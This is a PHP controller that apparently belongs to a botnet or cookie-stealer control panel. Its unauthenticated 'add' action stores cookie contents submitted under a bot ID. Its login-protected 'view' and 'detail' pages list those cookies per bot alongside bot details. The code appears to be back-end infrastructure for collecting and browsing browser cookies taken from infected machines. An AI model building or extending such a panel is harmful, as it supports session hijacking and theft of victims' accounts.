<?php
include_once("../Model/Bean/Cookies.php");
include_once("../Model/BO/BO_Cookies.php");
include_once("../Model/Bean/Bot.php");
include_once("../Model/BO/BO_Bot.php");

class C_Cookies
{
    public function addCookies()
    {
        $boCookies = new BO_Cookies();
        $idbot = $_REQUEST["idbot"];
        $detail = $_REQUEST["detail"];
        $content = $_REQUEST["content"];
        $boCookies->addCookies($idbot, $detail, $content);
    }
    public function view()
    {
        session_start();
        if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
            $id = $_REQUEST["ID"];
            $boCookies = new BO_Cookies();

            if (!isset($_REQUEST["page"]) || $_REQUEST["page"] == 0) {
                $listCookies = $boCookies->getListCookies($id,0);
            } else {
                $listCookies = $boCookies->getListCookies($id, $_REQUEST["page"]);
            }    
           
            $count =$boCookies->getCountListCookies($id);
            include_once("../View/viewCookies.php");
        } else {
            include_once('../View/noLogin.php');
        }
    }
    public function CookiesDetail()
    {
        session_start();
        if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
            $idCookies = $_REQUEST["IdCookies"];
            $idBot = $_REQUEST["IdBot"];
            $boCookies = new BO_Cookies();
            $boBot = new BO_Bot();
            $cookiesDetail = $boCookies->getCookiesDetail($idCookies);
            $bot = $boBot->getBotDetail($idBot);
            include_once("../View/viewCookiesDetail.php");
        } else {
            include_once('../View/noLogin.php');
        }
    }
}
$C_Cookies = new C_Cookies();
if (isset($_REQUEST["opt"])) {
    $option = $_REQUEST["opt"];
    if ($option == "add") {
        $C_Cookies->addCookies();
    } else if ($option == "view") {
        $C_Cookies->view();
    } else if ($option == "detail") {
        $C_Cookies->CookiesDetail();
    }
}
